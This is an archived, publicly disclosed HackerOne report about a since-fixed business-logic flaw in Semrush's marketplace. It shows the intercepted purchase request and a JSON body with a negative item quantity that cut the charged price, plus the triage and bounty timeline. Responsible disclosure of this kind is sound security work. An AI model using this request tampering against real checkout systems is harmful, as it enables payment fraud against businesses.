---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/business-logic-errors
  - env/web
substate: "resolved"
weakness: "Business Logic Errors"
enriched: true
body: true
date: 2020-04-02
submitted: 2020-01-10T15:18:20.869Z
bounty_usd: null
votes: 267
cve: []
program: "[[programs/semrush|Semrush]]"
reporter: "yashrs"
source: "https://hackerone.com/reports/771694"
title: "An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss"
---
# An attacker can buy marketplace articles for lower prices as it allows for negative quantity values leading to business loss

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 267 | **Program:** Semrush | **Disclosed:** 2020-04-02

- Report: [https://hackerone.com/reports/771694](https://hackerone.com/reports/771694)
- CWE: Business Logic Errors
- Submitted: 2020-01-10T15:18:20.869Z

## Report summary

The SEMrush team triaged and patched this issue in less than 24 hours. That's a great turnaround time! It was nice working with the team :)

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi there,

When we
**Summary:** 
When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attacker can pay for less than intended due to  negative quantities being allowed. 

## Steps To Reproduce:
- Go to https://www.semrush.com/marketplace/offers/
- Click on 500 Words($40) Order Now button.
- Select any two articles.
- Intercept the request:

```
POST /marketplace/api/purchases/bulk HTTP/1.1
Host: www.semrush.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.semrush.com/marketplace/offers/
Content-type: application/json
Origin: https://www.semrush.com
Content-Length: 45
DNT: 1
Connection: close
Cookie: COOKIES

{"items":{"article_500":1,"article_1000":1}}
```

- The actual price should be $110 for two articles.

Change the JSON body to :

```
{"items":{"article_500":4,"article_1000":-2}}
```

- The cost will become $20 for two articles:
4 * $40- 2 * $70= $160 - $140 = $20

████

I even tried with my Virtual Card. Here is the failed payment. This is the proof that it actually charges the lowered amount:
██████████

Regards,
Yash

## Impact

An attacker can buy articles at much lower rates by exploiting this vulnerability which could cause severe business losses to Semrush

## Timeline

- **Report Filed**
- **2020-01-10** @wshuwll: Hi! Thanks for the report, we will investigate this.
- **2020-01-10** @yashrs: Woah that's a very quick response, @wshuwll. Thanks for looking into it
- **2020-01-10** @wshuwll: Bug's pushed to appropriate team. We are waiting for team's response.
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **2020-01-11** @yashrs: @wshuwll Nice quick fix! The endpoint returns `bad amount` now.
- **2020-01-11** @yashrs: > But we need more time to gather information to set right severity. 

I made a sample calculator for showing the impact:████. This is an example:
████

An attacker could do 193 articles at $10(better example than the one given in my report). The original price should be around $10k.. that's like 1000 times less value and hence business loss. Not critical as this could have been detected in the backend by some staff if someone did order such a big number of articles, but not medium as this could have led to quite losses if exploited.

In any case, the turnaround time for this bug was amazing.

Regards,
Yash
- **2020-01-11** @yashrs: Also @wshuwll, is there anyway I could get a promo-code/voucher for testing the paid features of SEMrush? I would be very glad to test that functionality of the website. The free plan is very limited in terms of features.
- **Report Severity Updated**
- **2020-01-13** @wshuwll: Hello, @yashrs ! We discussed and confirmed that severity is high. 
Here is your promo https://www.semrush.com/product/promo/accept.html?promo=████
You have one week to activate it and it will last for 2 weeks. Here you can see a brief description of Business plan's features - https://www.semrush.com/prices/#table.

Cheers!
- **Bounty Awarded**
- **Report Resolved**
- **2020-01-22** @wshuwll: Hi, @yashrs ! I'm so sorry, I didn't pay you the full price according to our program!
- **Bounty Awarded**
- **2020-01-29** @wshuwll: Hi, @yashrs ! We launched new payment feature in Marketplace. We will be very happy if you testing it! https://www.semrush.com/marketplace/subscriptions/
- **2020-01-29** @yashrs: Thanks a lot for letting me know @wshuwll. I will look into it and try something :D
- **Agreed On Going Public**
- **2020-03-11** @wshuwll: Yep, we can disclose it, but limited. We will do it this week!
- **2020-03-20** @yashrs: Hi @wshuwll, just wanted to tell you if you don't take any action, this would be disclosed as full in a few days automatically. I have added basic summary on the top of the report. If you're fine with that, we can do a limited disclosure as you said :) Purpose of disclose is just sharing info with the community so they can learn from this as well
- **2020-04-01** @wshuwll: Hi, @yashrs ! Sorry for delay, I missed your last message. We've made a decision disclose report fully tomorrow! :)
- **Agreed On Going Public**
- **Report Became Public**
